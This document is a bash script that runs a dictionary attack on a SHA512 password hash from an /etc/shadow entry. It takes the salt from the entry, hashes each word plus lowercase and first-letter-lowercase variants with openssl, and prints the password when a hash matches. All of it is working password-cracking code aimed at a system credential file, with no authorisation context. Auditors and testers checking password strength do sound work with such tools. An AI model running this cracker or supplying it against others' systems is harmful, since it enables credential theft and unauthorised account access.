#!/bin/bash

#
# decrypt /etc/shadow user password using dictionary
# the script will brute force the original string as well as lowercase and camelcase permutations of it
# NOTE the hash algorithm must be SHA512
# NOTE dictionary must consist of properly capitalized strings
#

# make sure all args are provided
if [ -z "$1" ] || [ -z "$2" ]
  then
    echo "usage: $1 <dictionary> </etc/shadow user entry>"
    exit 1
fi

# parse args
SHA512=$(echo -n $2 | cut -d: -f2)
SALT=$(echo -n $SHA512 | cut -d$ -f3)
HASH=$(echo -n $SHA512 | cut -d$ -f4)

# iterate dictionary
for WORD in $(cat $1)
do

    # generate permutations
    WORD_LOWERCASE=$(echo -n $WORD | sed -e 's/\(.*\)/\L\1/')
    WORD_CAMELCASE=$(echo -n $WORD | sed -e 's/^./\L&\E/')

    # iterate permutations
    for PERMUTATION in $WORD $WORD_LOWERCASE $WORD_CAMELCASE
    do

        # eval for a match
        echo "Trying $PERMUTATION..."
        if [ "$(openssl passwd -6 -salt $SALT $PERMUTATION)" = "$SHA512" ]
        then
            echo "$PERMUTATION is the password!"
            exit 0
        fi

    done

done

echo "No password in dictionary matches the given entry"